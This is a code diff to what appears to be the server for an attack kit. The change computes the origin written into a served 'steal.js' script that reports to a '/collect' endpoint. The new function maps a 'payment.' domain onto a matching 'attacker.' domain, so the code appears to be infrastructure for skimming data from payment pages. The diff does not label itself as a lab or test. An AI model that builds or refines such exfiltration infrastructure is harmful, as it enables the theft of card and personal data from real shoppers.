@@ -49,10 +49,28 @@ function buildProtocolRelativeBase(hostRaw) {
 }
 
 /**
- * Browsers load /steal.js from the public attacker host; prefer that Host + forwarded
- * proto over ATTACKER_URL so WAF / multi-domain deploys are not stuck on a stale env URL.
- * Set FORCE_ATTACKER_URL_FROM_ENV=1 to always bake ATTACKER_URL into the script.
+ * Origin baked into steal.js for `/collect`:
+ * Prefer PAYMENT_DOMAIN (payment.* → attacker.*) before Host or ATTACKER_DOMAIN,
+ * so a stale Host (e.g. old VIP hostname) does not skew the inlined target.
+ * Set FORCE_ATTACKER_URL_FROM_ENV=1 with ATTACKER_URL to bake a fixed origin.
  */
+function resolveStealJsTargetHost(req) {
+  const cfgPay = (process.env.PAYMENT_DOMAIN || '').trim();
+  const explicit = (process.env.ATTACKER_DOMAIN || '').trim();
+  const fwd = forwardedHost(req);
+
+  if (cfgPay.startsWith('payment.')) {
+    return `attacker.${cfgPay.slice('payment.'.length)}`;
+  }
+  if (explicit) {
+    return explicit;
+  }
+  if (fwd) {
+    return fwd;
+  }
+  return '';
+}
+
 function getPublicAttackerOrigin(req) {
   const legacy = (process.env.ATTACKER_URL || '').trim();
   const forceEnv = (process.env.FORCE_ATTACKER_URL_FROM_ENV || '') === '1';
@@ -60,9 +78,7 @@ function getPublicAttackerOrigin(req) {
     return normalizeLegacyOrigin(legacy);
   }
 
-  const host =
-    forwardedHost(req) ||
-    (process.env.ATTACKER_DOMAIN || '').trim();
+  const host = resolveStealJsTargetHost(req);
   if (host) {
     return buildProtocolRelativeBase(host);
   }
